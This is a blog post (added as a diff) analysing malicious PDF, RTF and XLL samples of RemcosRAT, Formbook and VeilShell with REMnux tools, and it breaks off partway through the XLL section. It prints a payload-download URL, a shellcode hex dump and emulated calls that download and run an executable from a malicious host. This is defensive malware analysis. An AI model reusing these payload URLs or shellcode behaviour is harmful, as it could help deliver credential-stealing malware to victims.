@@ -1,0 +1,612 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>Analyzing Eight Malicious Documents in a Single Day: Techniques, Tools, and Key Findings — byevincent</title>
+    <meta property="og:title" content="Analyzing Eight Malicious Documents in a Single Day: Techniques, Tools, and Key Findings">
+    <meta property="og:description" content="After completing HackTheBox’s Malicious Document Analysis Module, I felt inspired to dive deeper into analyzing malicious documents independently. My goal was to analyze recent samples quickly, within a…">
+    <meta property="og:image" content="https://byevincent.xyz/img/2025/01/image-16.png">
+    <meta property="og:url" content="https://byevincent.xyz/posts/analyzing-eight-malicious-documents-in-a-single-day-techniques-tools-and-key-findings/">
+    <meta property="og:type" content="article">
+    <meta name="twitter:card" content="summary_large_image">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/css/styles.css">
+  </head>
+  <body>
+
+    <header class="site-header">
+      <div class="container header-inner">
+        <a class="logo" href="/">byevincent</a>
+        <nav class="nav">
+          <div class="nav-links">
+            <a href="/">Blog</a>
+            <a href="/about/">About</a>
+          </div>
+          <button class="theme-toggle" aria-label="Toggle theme">
+            <svg class="sun-icon" viewBox="0 0 24 24"><circle cx="12" cy="12" r="5"/><path d="M12 1v2M12 21v2M4.22 4.22l1.42 1.42M18.36 18.36l1.42 1.42M1 12h2M21 12h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42"/></svg>
+            <svg class="moon-icon" viewBox="0 0 24 24"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
+          </button>
+          <button class="nav-toggle" aria-label="Toggle navigation" aria-expanded="false">
+            <span></span><span></span><span></span>
+          </button>
+        </nav>
+      </div>
+    </header>
+
+    <main class="container">
+      <div class="post-container">
+        <header class="post-header">
+          <h1>Analyzing Eight Malicious Documents in a Single Day: Techniques, Tools, and Key Findings</h1>
+          <div class="meta">By <strong>Vincent Dinh</strong> &bull; <time datetime="2025-01-26">Jan 26, 2025</time> &bull; <span class="tag">Malware</span></div>
+        </header>
+        <article class="post-article">
+
+          
+<figure><img alt="" src="/img/2025/01/image-2.png"/></figure>
+<figure><img alt="" src="/img/2025/01/image-3.png"/></figure>
+<p id="9987">After completing HackTheBox’s Malicious Document Analysis Module, I felt inspired to dive deeper into analyzing malicious documents independently. My goal was to analyze recent samples quickly, within a single day, using documents from MalwareBazaar. During this process, I extracted payloads and Indicators of Compromise (IoCs). In this blog, I dive deep into PDFs, RTFs, and XLL add-ins from the RemcosRAT, Formbook, and VeilShell malware families.</p>
+<p id="5796">The goal of this analysis was not only to uncover the methods used to embed and conceal malicious content but also to demonstrate the practical application of tools such as <code>Peepdf, rtfdump.py, </code>and<code> Excel DNA</code>.</p>
+<h2 id="db33">Environment and Tools</h2>
+<p id="ea11">I used the following setup for a controlled and efficient analysis:</p>
+<ul>
+<li> <strong>VM Environment:</strong> REMnux for secure malware analysis</li>
+<li><strong>Windows VM:</strong> x64dbg, ExcelDNA, dnSpy, and PE-Bear</li>
+<li><strong>PDF Analysis:</strong> Tools like PDFiD, PDFParser, and Peepdf</li>
+<li><strong>Office Documents:</strong> oletools suite</li>
+<li><strong>RTF Analysis:</strong> rtfdump.py, scdbg, XORSearch</li>
+<li><strong>File Identification:</strong> trid</li>
+</ul>
+<p id="3a08">While most tools were pre-installed in REMnux, I added the <code><a href="https://github.com/DidierStevens/DidierStevensSuite/blob/master/plugin_biff.py" rel="noreferrer noopener" target="_blank">plugin_biff.py</a></code> add-on for advanced Excel file analysis.</p>
+<h2 id="eb3d">Initial Triage and File Identification</h2>
+<p id="2088">Each document analysis began with an identification step using <strong>trid</strong>.</p>
+<ul>
+<li>For example:</li>
+</ul>
+<pre><code>remnux@remnux:~/Downloads$ trid 9d02bf092fdcf44a51ae6e264ec3e3e57afbe79622c92a797e33fb62ed495cda.docx 
+
+TrID/32 - File Identifier v2.24 - (C) 2003-16 By M.Pontello
+Definitions found:  18251
+Analyzing...
+
+Collecting data from file: 9d02bf092fdcf44a51ae6e264ec3e3e57afbe79622c92a797e33fb62ed495cda.docx
+ 52.2% (.DOCX) Word Microsoft Office Open XML Format document (23500/1/4)
+ 38.8% (.ZIP) Open Packaging Conventions container (17500/1/4)
+  8.8% (.ZIP) ZIP compressed archive (4000/1)bas</code></pre>
+<h1 class="wp-block-heading" id="b75b">PDF Analysis (RemcosRAT)</h1>
+<p id="1226"><strong>Remcos Remote Access Trojan (RemcosRAT)</strong> is designed to provide full remote control over infected systems. While it is marketed as a legitimate administration tool by its creators, it is frequently abused by cybercriminals for malicious purposes.</p>
+<figure><img alt="" src="/img/2025/01/image-4.png"/><figcaption class="wp-element-caption">I chose RemcosRAT because I had heard of it and it had a signature on Malware Bazaar.</figcaption></figure>
+<p><a href="https://bazaar.abuse.ch/sample/43987e781d3195cb2d75e0a9acca5de1cbd7eefd2010cce9afd897d5e8c9f594/" rel="noreferrer noopener" target="_blank">RemcosRAT Sample</a></p>
+<pre><code>trid 43987e781d3195cb2d75e0a9acca5de1cbd7eefd2010cce9afd897d5e8c9f594.pdf 
+
+TrID/32 - File Identifier v2.24 - (C) 2003-16 By M.Pontello
+Definitions found:  18251
+Analyzing...
+
+Collecting data from file: 43987e781d3195cb2d75e0a9acca5de1cbd7eefd2010cce9afd897d5e8c9f594.pdf
+100.0% (.PDF) Adobe Portable Document Format (5000/1)</code></pre>
+<ul>
+<li>The sample was verified as a 100% PDF using <code>trid</code>.</li>
+</ul>
+<h2 id="8af7">PDF-Parser and PDF-ID Analysis</h2>
+<p id="833f"><strong>Introduction to the</strong> <strong>Tools</strong></p>
+<p id="300d"><code>pdfid.py</code>: Identifies key characteristics of a PDF file, such as the presence of <code>/JavaScript</code>, <code>/OpenAction</code>, <code>/ObjStm</code>, and other potentially dangerous elements. It also calculates entropy to highlight suspicious embedded content.</p>
+<p id="2e75"><code>pdf-parser.py</code> is a Python-based tool that analyzes the internal structure of PDF files, providing detailed insights into potentially malicious content, objects, and metadata.</p>
+<p id="1f3e"><strong>Execution of Commands and Results</strong></p>
+<p id="2039"><strong>PDFiD Analysis</strong></p>
+<ul>
+<li>The following command was used to analyze the sample file and extract key metadata:</li>
+<li>The <code>-e</code> flag is particularly useful for obtaining entropy values, object types, and associated entries.</li>
+</ul>
+<pre><code>remnux@remnux:~/Downloads$ pdfid.py 43987e781d3195cb2d75e0a9acca5de1cbd7eefd2010cce9afd897d5e8c9f594.pdf -e</code></pre>
+<ul>
+<li>The analysis revealed the following:</li>
+</ul>
+<pre><code>PDFiD 0.2.8 43987e781d3195cb2d75e0a9acca5de1cbd7eefd2010cce9afd897d5e8c9f594.pdf
+ PDF Header: %PDF-1.7
+ obj                   14
+ endobj                14
+ stream                12
+ endstream             12
+ /ObjStm                1
+ /AcroForm              1
+ /URI                   0
+ Total entropy:           7.975268 (36017 bytes)
+ Entropy inside streams:  7.985894 (34262 bytes)
+ Entropy outside streams: 0.000000 (1755 bytes)</code></pre>
+<ul>
+<li>Presence of <code>/ObjStm</code> indicates embedded object streams, which are often used to obfuscate malicious content.</li>
+<li><code>/AcroForm</code> detected, suggesting embedded interactive forms.</li>
+<li>No <code>/JavaScript</code> or <code>/OpenAction</code> objects, reducing suspicion of common execution triggers.</li>
+</ul>
+<p><strong>PDF-Parser Analysis</strong></p>
+<p>The <code>pdf-parser.py</code> tool was then employed to investigate specific objects within the file further:</p>
+<pre><code>remnux@remnux:~/Downloads$ pdf-parser.py 43987e781d3195cb2d75e0a9acca5de1cbd7eefd2010cce9afd897d5e8c9f594.pdf</code></pre>
+<p>The output focused on objects of interest:</p>
+<pre><code>obj 2 0
+ Type: /Catalog
+ Referencing: 4 0 R, 5 0 R
+ &lt;&lt;
+   /Type /Catalog
+   /Pages 4 0 R
+   /AcroForm 5 0 R
+ &gt;&gt;
+
+obj 1 0
+ Type: /ObjStm
+ Referencing: 29 0 R
+ Contains stream
+ &lt;&lt;
+   /Type /ObjStm
+   /N 16
+   /First 103
+   /Filter /FlateDecode
+   /Length 29 0 R
+ &gt;&gt;
+
+obj 21 0
+ Type: /XObject
+ Referencing: 24 0 R
+ Contains stream
+ &lt;&lt;
+   /Type /XObject
+   /Subtype /Image
+   /Width 900
+   /Height 1164
+   /BitsPerComponent 8
+   /ColorSpace /DeviceGray
+   /Filter [/FlateDecode /DCTDecode]
+   /Length 13634
+ &gt;&gt;
+
+obj 30 0
+ Type: /XRef
+ Referencing: 2 0 R, 3 0 R
+ Contains stream
+ &lt;&lt;
+   /Size 31
+   /Root 2 0 R
+   /Info 3 0 R
+   /ID [&lt;E8B47CAEFEC9840FFA878719DAE58EAF&gt; &lt;E8B47CAEFEC9840FFA878719DAE58EAF&gt;]
+   /Type /XRef
+   /Filter /FlateDecode
+   /Length 100
+ &gt;&gt;</code></pre>
+<ul>
+<li>As of right now, we are primarily concerned with the <code>/AcroForm</code> and <code>/ObjStm</code>. To accomplish this, we can use the ObjStm plugin with pdf-parser.</li>
+<li>An <code>/URI</code> linking to external content was also detected, warranting further investigation.</li>
+<li><strong>ObjStm</strong>: An object stream in PDFs that contains multiple compressed objects to optimize file size and structure.</li>
+<li><strong>AcroForm</strong>: A PDF structure that enables interactive forms, such as text fields, checkboxes, and buttons, for user input.</li>
+</ul>
+<pre><code>remnux@remnux:~/Downloads$ pdf-parser.py 43987e781d3195cb2d75e0a9acca5de1cbd7eefd2010cce9afd897d5e8c9f594.pdf --objstm
+PDF Comment '%PDF-1.7\n'
+
+obj 15 0
+ Containing /ObjStm: 1 0
+ Type: 
+ Referencing: 19 0 R, 20 0 R
+
+  &lt;&lt;
+    /Helv 19 0 R
+    /ZaDb 20 0 R
+  &gt;&gt;
+
+obj 16 0
+ Containing /ObjStm: 1 0
+ Type: 
+ Referencing: 21 0 R, 22 0 R, 23 0 R
+
+  &lt;&lt;
+    /X0 21 0 R
+    /Im2 22 0 R
+    /Im3 23 0 R
+  &gt;&gt;
+
+obj 17 0
+ Containing /ObjStm: 1 0
+ Type: /Action
+ Referencing: 
+
+  &lt;&lt;
+    /Type /Action
+    /S /URI
+    /URI (https://2012.filemail.com/api/file/get?filekey=ytyQUUZwEeijkbLbKoMvyf0YvBoqUg4Fufe6zGM0dPsUyU-wFFP0pUcwI9xAZPaEI-rrsI6M0JRZ03-gDQ&amp;pk_vid=0036e245a09a84ae173430670396c326)
+  &gt;&gt;
+
+obj 18 0
+ Containing /ObjStm: 1 0
+ Type: 
+ Referencing: 
+
+  &lt;&lt;
+    /W 0
+  &gt;&gt;</code></pre>
+<ul>
+<li><code>/AcroForm</code> (object 2) references object 4, suggesting interactive forms.</li>
+<li><code>/ObjStm</code> (object 1) compresses multiple objects, obfuscating their true nature.</li>
+<li>Object 17 contains a <code>/URI</code>, pointing to an external link likely used to deliver a malicious payload. To evaluate the <code>/AcroForm</code> potential malicious activity, <code>Peepdf</code> was used due to its advanced capabilities in object mapping and interactive analysis.</li>
+</ul>
+<h2 id="61de">Peepdf Object Analysis</h2>
+<pre><code>remnux@remnux:~/Downloads$ peepdf 43987e781d3195cb2d75e0a9acca5de1cbd7eefd2010cce9afd897d5e8c9f594.pdf -i 
+File: 43987e781d3195cb2d75e0a9acca5de1cbd7eefd2010cce9afd897d5e8c9f594.pdf
+MD5: 403e27e527baabeb53ef83b99c4cadee
+SHA1: 44d2696a0a31ce7c15553bf88e1605e67a4e6545
+SHA256: 43987e781d3195cb2d75e0a9acca5de1cbd7eefd2010cce9afd897d5e8c9f594
+Size: 36017 bytes
+IDs: 
+ Version 0: [ &lt;E8B47CAEFEC9840FFA878719DAE58EAF&gt; &lt;E8B47CAEFEC9840FFA878719DAE58EAF&gt; ]
+
+PDF Format Version: 1.7
+Binary: True
+Linearized: False
+Encrypted: False
+Updates: 0
+Objects: 30
+Streams: 12
+URIs: 1
+Comments: 0
+Errors: 0
+
+Version 0:
+ Catalog: 2
+ Info: 3
+ Objects (30): [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30]
+ Compressed objects (16): [3, 4, 5, 6, 7, 8, 14, 15, 16, 17, 18, 19, 20, 24, 25, 27]
+ Streams (12): [1, 9, 10, 11, 12, 13, 21, 22, 23, 26, 28, 30]
+ Xref streams (1): [30]
+ Object streams (1): [1]
+ Encoded (12): [1, 9, 10, 11, 12, 13, 21, 22, 23, 26, 28, 30]
+ Objects with URIs (1): [17]
+ Suspicious elements (1):
+  /AcroForm (1): [2]</code></pre>
+<pre><code>PPDF&gt; object 2
+
+&lt;&lt; /Type /Catalog
+/Pages 4 0 R
+/AcroForm 5 0 R &gt;&gt;
+
+PPDF&gt; object 4
+
+&lt;&lt; /Type /Pages
+/Kids [ 6 0 R ]
+/Count 1 &gt;&gt;
+
+PPDF&gt; object 17
+
+&lt;&lt; /Type /Action
+/S /URI
+/URI https://2012.filemail.com/api/file/get?filekey=ytyQUUZwEeijkbLbKoMvyf0YvBoqUg4Fufe6zGM0dPsUyU-wFFP0pUcwI9xAZPaEI-rrsI6M0JRZ03-gDQ&amp;pk_vid=0036e245a09a84ae173430670396c326 &gt;&gt;</code></pre>
+<ul>
+<li>Object 2 (<code>/AcroForm</code>) and object 17 (<code>/URI</code>) were prioritized for further analysis.</li>
+<li>Initial findings from <code>peepdf -i</code> revealed the <code>/AcroForm</code> object located within object 2, with references to object 4. Upon further analysis, the <code>/AcroForm</code> was determined to be benign. However, object 17, containing the <code>/URI</code>, was examined for additional insight, likely the delivery mechanism for the <strong>RemcosRAT</strong> payload.</li>
+</ul>
+<p>The malicious PDF is crafted to deliver RemcosRAT, a remote access trojan used for full control over infected systems. It exploits embedded <code>/ObjStm</code> objects to conceal their true purpose while bypassing detection mechanisms. Once executed, the document retrieves and downloads the RemcosRAT payload, enabling attackers to gain unauthorized remote access, steal credentials, and monitor the victim's system.</p>
+<ul>
+<li>IOCs: hxxps[://]2012[.]filemail[.]com/api/file/get?filekey=ytyQUUZwEeijkbLbKoMvyf0YvBoqUg4Fufe6zGM0dPsUyU-wFFP0pUcwI9xAZPaEI-rrsI6M0JRZ03-gDQ&amp;pk_vid=0036e245a09a84ae173430670396c326</li>
+</ul>
+<figure><img alt="" src="/img/2025/01/image-5.png" style="width:782px;height:auto"/><figcaption class="wp-element-caption">VirusTotal Comment</figcaption></figure>
+<h1 class="wp-block-heading" id="f52f">RTF Analysis (Formbook)</h1>
+<h2 id="1d54">What are RTFs?</h2>
+<p id="fc24">RTF is primarily a benign document format, it is frequently exploited by attackers due to its ability to embed objects and payloads.</p>
+<ul>
+<li>RTFs can include OLE objects (e.g., executables or scripts) to deliver malware.</li>
+<li>Older vulnerabilities like <strong>CVE-2017–11882</strong> (Microsoft Equation Editor flaw) are commonly targeted.</li>
+<li>Shellcode is embedded in RTF objects to exploit software parsing the file.</li>
+</ul>
+<p id="e201"><strong>Formbook</strong> is a data-stealing malware known for targeting credentials, keystrokes, and other sensitive information. It’s often spread through malicious documents and uses obfuscation to avoid detection while quietly collecting data from infected systems.</p>
+<p id="6c48"><a href="https://bazaar.abuse.ch/sample/e53a57b9be38e41edf2f8cb4161ad6e155bfcb24990b5e1adbf12c8ba675710b/" rel="noreferrer noopener" target="_blank">Formbook RTF Sample</a></p>
+<ul>
+<li>Threat actors may rename <code>.rtf</code> extensions to <code>.doc</code> to ensure the file opens in Microsoft Word, although in this case, the file remains in the <code>.rtf</code> format.</li>
+</ul>
+<pre><code>trid e53a57b9be38e41edf2f8cb4161ad6e155bfcb24990b5e1adbf12c8ba675710b.rtf 
+
+TrID/32 - File Identifier v2.24 - (C) 2003-16 By M.Pontello
+Definitions found:  18251
+Analyzing...
+
+Collecting data from file: e53a57b9be38e41edf2f8cb4161ad6e155bfcb24990b5e1adbf12c8ba675710b.rtf
+100.0% (.RTF) Rich Text Format (5000/1)</code></pre>
+<h2 id="1f5a"><strong>rtfdump </strong>and <strong>CVE-2017–11882</strong></h2>
+<p id="043c">The tool <code>rtfdump.py</code> is instrumental in analyzing Rich Text Format (RTF) files, breaking them into individual objects for detailed inspection.</p>
+<ul>
+<li>Let’s check using rtfdump to check the objects present.</li>
+</ul>
+<pre style="margin-top:0;margin-bottom:0"><code>remnux@remnux:~/Downloads$ rtfdump.py e53a57b9be38e41edf2f8cb4161ad6e155bfcb24990b5e1adbf12c8ba675710b.rtf 
+    1 Level  1        c=    2 p=00000000 l=  825268 h=  193697;      18 b=       0   u=  248526 \rtf1
+    2  Level  2       c=    0 p=00000008 l=     227 h=       0;       5 b=       0   u=       0 
+    3  Level  2       c=    1 p=000000ef l=  825028 h=  193697;      18 b=       0   u=  248526 
+    4   Level  3      c=    3 p=00076b73 l=  339007 h=    3722;      18 b=       0   u=     369 \*\objdata878984
+    5    Level  4     c=    0 p=00076b84 l=      23 h=       0;       2 b=       0   u=       1 \*\mchr
+    6    Level  4     c=    0 p=00076b9f l=     617 h=     200;      18 b=       0   u=     368 \*\xmlattr615232522
+    7    Level  4     c=    0 p=00076e0c l=      57 h=       0;       4 b=       0   u=       0 \*\aexpnd615232522</code></pre>
+<ul>
+<li>In this analysis, object 4 was identified as a match with an object marked as <code>obj</code> on the far right.</li>
+<li>To further investigate object 4, it was viewed in hexadecimal format using the <code>-s 4 -H</code> flag.</li>
+</ul>
+<pre><code>remnux@remnux:~/Downloads$ rtfdump.py e53a57b9be38e41edf2f8cb4161ad6e155bfcb24990b5e1adbf12c8ba675710b.rtf -s 4 -H | more
+00000000: 51 D2 FC BE E6 ED 56 D8  B4 DD F0 D7 33 71 E6 BB  Q.....V.....3q..
+00000010: 2C 8E 88 B2 B2 C4 ED E9  CA D4 65 FE 1E EA CE E9  ,.........e.....
+00000020: 9C BE F3 DB 88 BD ED 2B  AD F1 93 85 62 BA BC F9  .......+....b...
+00000030: 62 CB B3 2E D7 E1 2D B7  BC AF BE 8C 9C AC B6 22  b.....-........"
+00000040: 1F A5 AD A5 38 B6 21 DE  6B E1 77 CD 23 BA 6E 58  ....8.!.k.w.#.nX
+00000050: 4D C3 F7 3E 3F 88 ED 9C  F4 BD ED F2 AE AA 60 F1  M..&gt;?.........`.
+00000060: D4 BA AC AE 80 D0 F1 78  02 00 00 00 0B 00 00 00  .......x........
+00000070: 45 51 55 61 74 49 4F 4E  2E 33 00 00 00 00 00 00  EQUatION.3......
+00000080: 00 00 00 B6 06 00 00 02  7E F7 EB 47 6C 01 05 77  ........~..Gl..w
+00000090: 59 ED EC C9 00 00 00 00  00 00 00 00 00 00 00 00  Y...............
+000000A0: 00 00 00 00 00 00 00 00  00 00 00 00 50 06 45 00  ............P.E.
+000000B0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+000000C0: 00 00 00 00 00 00 00 00  00 00 00 00 29 C3 44 00  ............).D.
+000000D0: 00 00 00 E9 4F 01 00 00  BE C9 34 F8 6D 83 8F 96  ....O.....4.m...
+000000E0: 3C 38 CA D8 3B 63 9A 73  14 04 6A 3F 3F DA 98 78  &lt;8..;c.s..j??..x
+000000F0: 4D AD B2 FE 20 85 C0 96  33 F6 7B 28 CC 4B 90 00  M... ...3.{(.K..
+00000100: 4E E1 E0 0E 6B 4C BE 27  6B AF 37 43 67 EB 47 BF  N...kL.'k.7Cg.G.
+00000110: 92 E5 1F 99 6A C7 64 B8  0C 42 6F 22 5F C6 8D 43  ....j.d..Bo"_..C
+00000120: 66 CA 42 2E 6F 08 7F D5  66 BD F1 51 06 EE 33 1E  f.B.o...f..Q..3.
+00000130: 1A 9F 18 5D CA 1A E3 12  CC 30 8F 64 A9 70 08 DF  ...].....0.d.p..
+00000140: 01 73 71 B7 C9 13 5E FC  89 AB 18 E7 98 60 DD 17  .sq...^......`..</code></pre>
+<ul>
+<li>This revealed the keyword <code>EQUatION.3</code>, indicating a link to <strong>CVE-2017-11882</strong>. This vulnerability is associated with the Microsoft Equation Editor and has been widely exploited in numerous malware samples by embedding shellcode within objects to execute arbitrary code.</li>
+</ul>
+<figure><img alt="" src="/img/2025/01/image-6.png"/></figure>
+<figure><img alt="" src="/img/2025/01/image-7.png"/><figcaption class="wp-element-caption"><a href="https://unit42.paloaltonetworks.com/unit42-analysis-of-cve-2017-11882-exploit-in-the-wild/" rel="noreferrer noopener" target="_blank">Analysis of CVE-2017–11882 Exploit in the Wild</a></figcaption></figure>
+<ul>
+<li><code>format-bytes.py</code>, which breaks down structured binary data for easier interpretation, is used with the Microsoft Equation Editor Format <strong>(EQN), </strong>where the header often reveals if shellcode or payloads are embedded within the document.</li>
+</ul>
+<pre><code>remnux@remnux:~/Downloads$ rtfdump.py e53a57b9be38e41edf2f8cb4161ad6e155bfcb24990b5e1adbf12c8ba675710b.rtf -s 4 -H | format-bytes.py -f name=eqn1
+ 1:   &lt;class 'int'&gt;       3030 size of EQNOLEFILEHDR
+ 2:   &lt;class 'int'&gt;   30303030 
+ 3:   &lt;class 'int'&gt;       3030 
+ 4:   &lt;class 'int'&gt;   3135203a 
+ 5:   &lt;class 'int'&gt;   20324420 
+ 6:   &lt;class 'int'&gt;   42204346 
+ 7:   &lt;class 'int'&gt;   36452045 
+ 8:   &lt;class 'int'&gt;   20444520 
+ 9:   &lt;class 'int'&gt;         35 Start MTEF header
+10:   &lt;class 'int'&gt;         36 
+11:   &lt;class 'int'&gt;         20 
+12:   &lt;class 'int'&gt;         44 
+13:   &lt;class 'int'&gt;         38 
+14:   &lt;class 'int'&gt;         20 Full size record
+15:   &lt;class 'int'&gt;         20 Line record
+16:   &lt;class 'int'&gt;         42 Font record
+17:   &lt;class 'int'&gt;         34 
+18:   &lt;class 'int'&gt;         20 
+19: &lt;class 'bytes'&gt;         40 DD F0 D7 3 b'44442046302044372033' 3.258695 5f303dc2df13765f98b2dace4620c1cd Shellcode/Command (fontname)
+20:   &lt;class 'int'&gt;   30303030 
+21:   &lt;class 'int'&gt;   3a303130 
+22:   &lt;class 'int'&gt;         20 
+23:   &lt;class 'int'&gt;         32 
+Remainder: 8910
+00000000: 43 20 38 45 20 38 38 20  42 32 20 42 32 20 43 34  C 8E 88 B2 B2 C4
+00000010: 20 45 44 20 45 39 20 20  43 41 20 44 34 20 36 35   ED E9  CA D4 65
+00000020: 20 46 45 20 31 45 20 45  41 20 43 45 20 45 39 20   FE 1E EA CE E9 
+00000030: 20 2C 2E 2E 2E 2E 2E 2E  2E 2E 2E 65 2E 2E 2E 2E   ,.........e....
+00000040: 2E 0A 30 30 30 30 30 30  32 30 3A 20 39 43 20 42  ..00000020: 9C B
+00000050: 45 20 46 33 20 44 42 20  38 38 20 42 44 20 45 44  E F3 DB 88 BD ED
+00000060: 20 32 42 20 20 41 44 20  46 31 20 39 33 20 38 35   2B  AD F1 93 85
+00000070: 20 36 32 20 42 41 20 42  43 20 46 39 20 20 2E 2E   62 BA BC F9  ..
+00000080: 2E 2E 2E 2E 2E 2B 2E 2E  2E 2E 62 2E 2E 2E 0A 30  .....+....b....0
+00000090: 30 30 30 30 30 33 30 3A  20 36 32 20 43 42 20 42  0000030: 62 CB B
+000000A0: 33 20 32 45 20 44 37 20  45 31 20 32 44 20 42 37  3 2E D7 E1 2D B7
+000000B0: 20 20 42 43 20 41 46 20  42 45 20 38 43 20 39 43    BC AF BE 8C 9C
+000000C0: 20 41 43 20 42 36 20 32  32 20 20 62 2E 2E 2E 2E   AC B6 22  b....
+000000D0: 2E 2D 2E 2E 2E 2E 2E 2E  2E 2E 22 0A 30 30 30 30  .-........".0000
+000000E0: 30 30 34 30 3A 20 31 46  20 41 35 20 41 44 20 41  0040: 1F A5 AD A
+000000F0: 35 20 33 38 20 42 36 20  32 31 20 44 45 20 20 36  5 38 B6 21 DE  6
+
+1I: s 67 u 67
+2I: sl 8259 ul 8259 sb 17184 ub 17184
+4I: sl 1161306179 ul 1161306179 sb 1126185029 ub 1126185029
+4F: l 2946.016357 b 160.219803
+4N: b 67.32.56.69 l 69.56.32.67
+4E: l 2006/10/20 01:02:59 b 2005/09/08 13:10:29
+8I: sl 2321667319160905795 ul 2321667319160905795 sb 4836927869340366880 ub 4836927869340366880
+8T: ul 8958/01/26 22:51:56.0905795 ub N/A
+8F: l 0.000000 b 2282734585912336.000000
+16G: b 43203845-2038-3820-4232-204232204334 m {45382043-3820-2038-4232-204232204334}</code></pre>
+<p>Once the presence of shellcode was confirmed, the next steps included extracting the shellcode, locating its entry point, and simulating its execution using <code>scdbg</code>.</p>
+<p></p>
+<h3><strong>Dumping the Shellcode</strong></h3>
+<ul>
+<li>Object 4 was selected for analysis using the <code>hexdecode</code> and <code>dump</code> flags to extract its content into a shellcode file.</li>
+</ul>
+<pre><code>rtfdump.py e53a57b9be38e41edf2f8cb4161ad6e155bfcb24990b5e1adbf12c8ba675710b.rtf -s 4 --hexdecode --dump &gt; formbookrtf.sc</code></pre>
+<ul>
+<li>Subsequently, <code>XORSearch</code> was employed with the <code>-W</code> flag, leveraging its built-in rules to identify the entry point within the shellcode file.</li>
+</ul>
+<pre><code>remnux@remnux:~/Downloads$ xorsearch -W formbookrtf.sc 
+Found XOR 00 position 0000025D: GetEIP method 2 EB09
+Found ROT 25 position 0000025D: GetEIP method 2 EB09
+Found ROT 24 position 0000025D: GetEIP method 2 EB09
+Found ROT 23 position 0000025D: GetEIP method 2 EB09
+Score: 260</code></pre>
+<ul>
+<li>To further examine the shellcode’s behavior, <code>scdbg</code> was utilized with the <code>-foff</code> flag to emulate execution starting at the identified offset (<code>0x25D</code>).</li>
+</ul>
+<pre><code>scdbg /f formbookrtf.sc /foff 0x25D</code></pre>
+<figure><img alt="" src="/img/2025/01/image-8.png"/></figure>
+<ul>
+<li>The output revealed a series of disassembled Windows API calls, which provide critical insight into the shellcode’s intended functionality:</li>
+<li><code>GetProcAddress</code>, <code>ExpandEnvironmentStringsW</code>: Preps the file path of <code>%APPDATA%\yhndfreshkl89221.exe</code> , which hides the file and has write access.</li>
+<li><code>LoadLibraryW</code>, <code>URLDownloadToFileW</code>: It loads a system library (<code>urlmon.dll</code>) and uses the <code>URLDownloadToFileW</code> function to download a file from hxxps[://]ftvproclad[.]top/wyfRlocEnjsHiix[.]exe.</li>
+<li><code>CreateProcessW</code>: Executes the file.</li>
+<li><code>ExitProcess</code>: Shuts down the script.</li>
+</ul>
+<figure><img alt="" src="/img/2025/01/image-9.png"/></figure>
+<pre><code>4014fc GetProcAddress(ExpandEnvironmentStringsW)
+40154b ExpandEnvironmentStringsW(%APPDATA%\yhndfreshkl89221.exe, dst=12fb84, sz=104)
+401560 LoadLibraryW(UrlMon)
+40157b GetProcAddress(URLDownloadToFileW)
+4015e3 URLDownloadToFileW(https://ftvproclad.top/wyfRlocEnjsHiix.exe, C:\users\remnux\Application Data\yhndfreshkl89221.exe)
+4015fb GetProcAddress(GetStartupInfoW)
+401605 GetStartupInfoW(12fda4)
+40161c GetProcAddress(CreateProcessW)
+401641 CreateProcessW( , C:\users\remnux\Application Data\yhndfreshkl89221.exe ) = 0x1269
+401655 GetProcAddress(ExitProcess)
+401659 ExitProcess(0)</code></pre>
+<p id="3ecb">The RTF document exploits CVE-2017–11882, a vulnerability in Microsoft Equation Editor, to execute the shellcode embedded within the file. The shellcode retrieves and executes additional payloads, enabling the attacker to install Formbook, a credential-stealing malware. Formbook captures sensitive data, such as keystrokes and credentials, while maintaining persistence through obfuscation.</p>
+<p id="9a26">IOCs: hxxps[://]ftvproclad[.]top/wyfRlocEnjsHiix[.]exe</p>
+<p id="90de">SHA256: 99544c011500dbc38b972fc49587047eb94ecfba56985fd3c9f59dd684dbf97b</p>
+<p></p>
+<h2>xll Analysis (VeilShell)</h2>
+<p id="99ea"><a href="https://bazaar.abuse.ch/sample/7e9f91f0cfe3769df30608a88091ee19bc4cf52e8136157e4e0a5b6530d510ec/" rel="noreferrer noopener" target="_blank">VeilShell XLL Sample</a></p>
+<h2 id="ecc6">What are XLLs?</h2>
+<p id="d8ea">XLL add-ins are specialized DLLs designed exclusively for Microsoft Excel. While less common than malicious macros or documents, XLLs possess unique capabilities that make them attractive to attackers:</p>
+<ul>
+<li><strong>Bypass Macro Restrictions</strong>: XLLs are not subject to Excel’s macro security settings.</li>
+<li><strong>Evasion of Security Tools</strong>: XLLs can bypass detection mechanisms more effectively than traditional macros.</li>
+<li><strong>Platform-Specific Complexity</strong>: Unlike VBA macros, which work across Word and Excel, XLLs are exclusive to Excel and inherently more complex.</li>
+</ul>
+<figure><img alt="" src="/img/2025/01/image-10.png"/><figcaption class="wp-element-caption">Pop-up asking for the user to enable the add-in</figcaption></figure>
+<ul>
+<li>When loaded, XLL files prompt users to enable the add-in. This process often occurs with fewer warnings compared to VBA macros, making XLLs particularly dangerous as they execute with minimal user intervention.</li>
+</ul>
+<h2 id="d255">xlAutoOpen export</h2>
+<p id="6eaa">An analysis of multiple <code>.xll</code> samples from Malware Bazaar reveals that the <code>xlAutoOpen</code> export is a consistent feature in both legitimate and malicious XLLs. As this function is automatically executed when an XLL is loaded, attackers use it as an entry point to embed malicious code, enabling activities such as shellcode decryption or malware downloads.</p>
+<figure><img alt="" src="/img/2025/01/image-11.png"/><figcaption class="wp-element-caption">x64dbg analysis of the xlAutoOpen Export</figcaption></figure>
+<h2 id="385a"><strong>Initial Inspection (PE-BEAR)</strong></h2>
+<p id="337a">The initial inspection using PE-BEAR revealed that XLLs, often developed in C/C++ or C#, can extend Excel’s functionality through frameworks like Excel DNA. A significant number of malicious XLLs leverage this framework for advanced functionality, necessitating further analysis using ExcelDNA-Unpack.</p>
+<figure><img alt="" src="/img/2025/01/image-12.png"/></figure>
